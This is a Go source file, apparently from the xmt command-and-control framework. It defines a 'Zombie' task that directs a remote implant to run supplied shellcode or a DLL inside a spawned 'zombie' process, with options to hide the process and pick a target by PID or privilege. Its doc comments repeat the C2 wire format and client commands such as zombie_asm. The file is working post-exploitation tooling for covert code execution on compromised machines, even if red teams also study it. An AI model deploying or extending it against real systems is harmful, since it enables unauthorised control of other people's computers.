package task

import (
	"io"
	"os"
	"time"

	"github.com/iDigitalFlame/xmt/cmd/filter"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/data"
)

// Zombie is a Tasklet that is similar to the 'cmd.Zombie' struct. This is
// used to Task a Client with running a specified zombie command.
//
// This can be directly used in the Session 'Tasklet' function instead of
// directly creating a Task.
//
// The Filter attribute will attempt to set the target that runs the Zombie
// Process. If none are specified, the Process will be ran under the client
// process.
//
// C2 Details:
//  ID: WvZombie
//
//  Input:
//      Zombie struct {
//          string          // Path
//          []byte          // Data
//          bool            // IsDLL
//          []string        // Args
//          string          // Dir
//          []string        // Environment
//          uint32          // Flags
//          bool            // Wait
//          int64           // Timeout
//          Filter struct { // Filter
//              bool        // Filter Status
//              uint32      // PID
//              bool        // Fallback
//              uint8       // Session
//              uint8       // Elevated
//              []string    // Exclude
//              []string    // Include
//          }
//          []byte          // Stdin Data
//      }
//  Output:
//      uint32              // PID
//      int32               // Exit Code
//      []byte              // Output (Stdout and Stderr)
//
// C2 Client Command:
//  zombie_asm <file> <args...>
//  zombie_dll <file> <args...>
//  zombie_dll_local <file> <args...>
type Zombie struct {
	Filter *filter.Filter

	Path, Dir string
	Data      []byte
	Env, Args []string

	Stdin   []byte
	Timeout time.Duration
	Flags   uint32

	// IsDLL is set to true if the 'Data' slice should be considered a DLL
	// file instead of raw Assembly.
	IsDLL      bool
	Wait, Hide bool
}

// SetStdin wil attempt to read all the data from the supplied reader to fill
// the Stdin byte array for this Process struct.
//
// This function will return an error if any errors occurs during reading.
func (z *Zombie) SetStdin(r io.Reader) error {
	var err error
	z.Stdin, err = io.ReadAll(r)
	return err
}

// Packet will take the configured Zombie options and will return a Packet
// and any errors that may occur during building.
//
// This allows Zombie to fulfil the 'Tasklet' interface.
//
// C2 Details:
//  ID: WvZombie
//
//  Input:
//      Process struct {
//          string          // Path
//          []byte          // Data
//          bool            // IsDLL
//          []string        // Args
//          string          // Dir
//          []string        // Environment
//          uint32          // Flags
//          bool            // Wait
//          int64           // Timeout
//          bool            // Filter Status
//          Filter struct { // Filter
//              bool        // Filter Status
//              uint32      // PID
//              bool        // Fallback
//              uint8       // Session
//              uint8       // Elevated
//              []string    // Exclude
//              []string    // Include
//          }
//          []byte          // Stdin Data
//      }
//  Output:
//      uint32              // PID
//      int32               // Exit Code
//      []byte              // Output (Stdout and Stderr)
//
// C2 Client Command:
//  zombie_asm <file> <args...>
//  zombie_dll <file> <args...>
//  zombie_dll_local <file> <args...>
func (z Zombie) Packet() (*com.Packet, error) {
	n := &com.Packet{ID: TvZombie}
	z.MarshalStream(n)
	return n, nil
}

// ZombieAsm will create a Zombie Tasklet that can be used to run the supplied
// Assembly in a Zombie process that uses the specified command line arguments.
//
// The Filter attribute will attempt to set the target that runs the zombie
// Process. If none are specified, the Process will be ran under the client
// process.
//
// C2 Details:
//  ID: WvZombie
//
//  Input:
//      Zombie struct {
//          string          // Path
//          []byte          // Data
//          bool            // IsDLL
//          []string        // Args
//          string          // Dir
//          []string        // Environment
//          uint32          // Flags
//          bool            // Wait
//          int64           // Timeout
//          bool            // Filter Status
//          Filter struct { // Filter
//              bool        // Filter Status
//              uint32      // PID
//              bool        // Fallback
//              uint8       // Session
//              uint8       // Elevated
//              []string    // Exclude
//              []string    // Include
//          }
//          []byte          // Stdin Data
//      }
//  Output:
//      uint32              // PID
//      int32               // Exit Code
//      []byte              // Output (Stdout and Stderr)
//
// C2 Client Command:
//  zombie_asm <file> <args...>
//  zombie_dll <file> <args...>
//  zombie_dll_local <file> <args...>
func ZombieAsm(b []byte, args ...string) *Zombie {
	return &Zombie{Data: b, Args: args}
}

// ZombieDLL will create a Zombie Tasklet that can be used to run the supplied
// DLL in a Zombie process that uses the specified command line arguments.
//
// The Filter attribute will attempt to set the target that runs the zombie
// Process. If none are specified, the Process will be ran under the client
// process.
//
// C2 Details:
//  ID: WvZombie
//
//  Input:
//      Zombie struct {
//          string          // Path
//          []byte          // Data
//          bool            // IsDLL
//          []string        // Args
//          string          // Dir
//          []string        // Environment
//          uint32          // Flags
//          bool            // Wait
//          int64           // Timeout
//          bool            // Filter Status
//          Filter struct { // Filter
//              bool        // Filter Status
//              uint32      // PID
//              bool        // Fallback
//              uint8       // Session
//              uint8       // Elevated
//              []string    // Exclude
//              []string    // Include
//          }
//          []byte          // Stdin Data
//      }
//  Output:
//      uint32              // PID
//      int32               // Exit Code
//      []byte              // Output (Stdout and Stderr)
//
// C2 Client Command:
//  zombie_asm <file> <args...>
//  zombie_dll <file> <args...>
//  zombie_dll_local <file> <args...>
func ZombieDLL(dll string, args ...string) *Zombie {
	return &Zombie{Path: dll, Args: args}
}

// MarshalStream writes the data for this Zombie to the supplied Writer.
func (z Zombie) MarshalStream(w data.Writer) error {
	if err := w.WriteString(z.Path); err != nil {
		return err
	}
	if err := w.WriteBytes(z.Data); err != nil {
		return err
	}
	if err := w.WriteBool(z.IsDLL); err != nil {
		return err
	}
	if err := data.WriteStringList(w, z.Args); err != nil {
		return err
	}
	if err := w.WriteString(z.Dir); err != nil {
		return err
	}
	if err := data.WriteStringList(w, z.Env); err != nil {
		return err
	}
	if err := w.WriteBool(z.Wait); err != nil {
		return err
	}
	if err := w.WriteUint32(z.Flags); err != nil {
		return err
	}
	if err := w.WriteInt64(int64(z.Timeout)); err != nil {
		return err
	}
	if err := w.WriteBool(z.Hide); err != nil {
		return err
	}
	if err := z.Filter.MarshalStream(w); err != nil {
		return err
	}
	if err := w.WriteBytes(z.Stdin); err != nil {
		return err
	}
	return nil
}

// UnmarshalStream reads the data for this Zombie from the supplied Reader.
func (z *Zombie) UnmarshalStream(r data.Reader) error {
	if err := r.ReadString(&z.Path); err != nil {
		return err
	}
	if err := r.ReadBytes(&z.Data); err != nil {
		return err
	}
	if err := r.ReadBool(&z.IsDLL); err != nil {
		return err
	}
	if err := data.ReadStringList(r, &z.Args); err != nil {
		return err
	}
	if err := r.ReadString(&z.Dir); err != nil {
		return err
	}
	if err := data.ReadStringList(r, &z.Env); err != nil {
		return err
	}
	if err := r.ReadBool(&z.Wait); err != nil {
		return err
	}
	if err := r.ReadUint32(&z.Flags); err != nil {
		return err
	}
	if err := r.ReadInt64((*int64)(&z.Timeout)); err != nil {
		return err
	}
	if err := r.ReadBool(&z.Hide); err != nil {
		return err
	}
	if err := z.Filter.UnmarshalStream(r); err != nil {
		return err
	}
	if err := r.ReadBytes(&z.Stdin); err != nil {
		return err
	}
	return nil
}

// ZombieAsmFile will create a Zombie Tasklet that can be used to run the
// supplied Assembly from the specified local (server) file source in a Zombie
// process that uses the specified command line arguments.
//
// The Filter attribute will attempt to set the target that runs the zombie
// Process. If none are specified, the Process will be ran under the client
// process.
//
// C2 Details:
//  ID: WvZombie
//
//  Input:
//      Zombie struct {
//          string          // Path
//          []byte          // Data
//          bool            // IsDLL
//          []string        // Args
//          string          // Dir
//          []string        // Environment
//          uint32          // Flags
//          bool            // Wait
//          int64           // Timeout
//          bool            // Filter Status
//          Filter struct { // Filter
//              bool        // Filter Status
//              uint32      // PID
//              bool        // Fallback
//              uint8       // Session
//              uint8       // Elevated
//              []string    // Exclude
//              []string    // Include
//          }
//          []byte          // Stdin Data
//      }
//  Output:
//      uint32              // PID
//      int32               // Exit Code
//      []byte              // Output (Stdout and Stderr)
//
// C2 Client Command:
//  zombie_asm <file> <args...>
//  zombie_dll <file> <args...>
//  zombie_dll_local <file> <args...>
func ZombieAsmFile(s string, args ...string) (*Zombie, error) {
	b, err := os.ReadFile(s)
	if err != nil {
		return nil, err
	}
	return &Zombie{Data: b, Args: args}, nil
}

// ZombieDLLFile will create a Zombie Tasklet that can be used to run the
// supplied DLL from the specified local (server) file source in a Zombie
// process that uses the specified command line arguments.
//
// The Filter attribute will attempt to set the target that runs the zombie
// Process. If none are specified, the Process will be ran under the client
// process.
//
// C2 Details:
//  ID: WvZombie
//
//  Input:
//      Zombie struct {
//          string          // Path
//          []byte          // Data
//          bool            // IsDLL
//          []string        // Args
//          string          // Dir
//          []string        // Environment
//          uint32          // Flags
//          bool            // Wait
//          int64           // Timeout
//          bool            // Filter Status
//          Filter struct { // Filter
//              bool        // Filter Status
//              uint32      // PID
//              bool        // Fallback
//              uint8       // Session
//              uint8       // Elevated
//              []string    // Exclude
//              []string    // Include
//          }
//          []byte          // Stdin Data
//      }
//  Output:
//      uint32              // PID
//      int32               // Exit Code
//      []byte              // Output (Stdout and Stderr)
//
// C2 Client Command:
//  zombie_asm <file> <args...>
//  zombie_dll <file> <args...>
//  zombie_dll_local <file> <args...>
func ZombieDLLFile(s string, args ...string) (*Zombie, error) {
	b, err := os.ReadFile(s)
	if err != nil {
		return nil, err
	}
	return &Zombie{Data: b, IsDLL: true, Args: args}, nil
}

// ZombieDLLReader will create a Zombie Tasklet that can be used to run the
// supplied DLL from the specified reader source in a Zombie process that uses
// the specified command line arguments.
//
// The Filter attribute will attempt to set the target that runs the zombie
// Process. If none are specified, the Process will be ran under the client
// process.
//
// C2 Details:
//  ID: WvZombie
//
//  Input:
//      Zombie struct {
//          string          // Path
//          []byte          // Data
//          bool            // IsDLL
//          []string        // Args
//          string          // Dir
//          []string        // Environment
//          uint32          // Flags
//          bool            // Wait
//          int64           // Timeout
//          Filter struct { // Filter
//              bool        // Filter Status
//              uint32      // PID
//              bool        // Fallback
//              uint8       // Session
//              uint8       // Elevated
//              []string    // Exclude
//              []string    // Include
//          }
//          []byte          // Stdin Data
//      }
//  Output:
//      uint32              // PID
//      int32               // Exit Code
//      []byte              // Output (Stdout and Stderr)
//
// C2 Client Command:
//  zombie_asm <file> <args...>
//  zombie_dll <file> <args...>
//  zombie_dll_local <file> <args...>
func ZombieDLLReader(r io.Reader, args ...string) (*Zombie, error) {
	b, err := io.ReadAll(r)
	if err != nil {
		return nil, err
	}
	return &Zombie{Data: b, IsDLL: true, Args: args}, nil
}

// ZombieAsmReader will create a Zombie Tasklet that can be used to run the
// supplied Assembly from the specified reader source in a Zombie process that
// uses the specified command line arguments.
//
// The Filter attribute will attempt to set the target that runs the zombie
// Process. If none are specified, the Process will be ran under the client
// process.
//
// C2 Details:
//  ID: WvZombie
//
//  Input:
//      Zombie struct {
//          string          // Path
//          []byte          // Data
//          bool            // IsDLL
//          []string        // Args
//          string          // Dir
//          []string        // Environment
//          uint32          // Flags
//          bool            // Wait
//          int64           // Timeout
//          bool            // Filter Status
//          Filter struct { // Filter
//              bool        // Filter Status
//              uint32      // PID
//              bool        // Fallback
//              uint8       // Session
//              uint8       // Elevated
//              []string    // Exclude
//              []string    // Include
//          }
//          []byte          // Stdin Data
//      }
//  Output:
//      uint32              // PID
//      int32               // Exit Code
//      []byte              // Output (Stdout and Stderr)
//
// C2 Client Command:
//  zombie_asm <file> <args...>
//  zombie_dll <file> <args...>
//  zombie_dll_local <file> <args...>
func ZombieAsmReader(r io.Reader, args ...string) (*Zombie, error) {
	b, err := io.ReadAll(r)
	if err != nil {
		return nil, err
	}
	return &Zombie{Data: b, Args: args}, nil
}
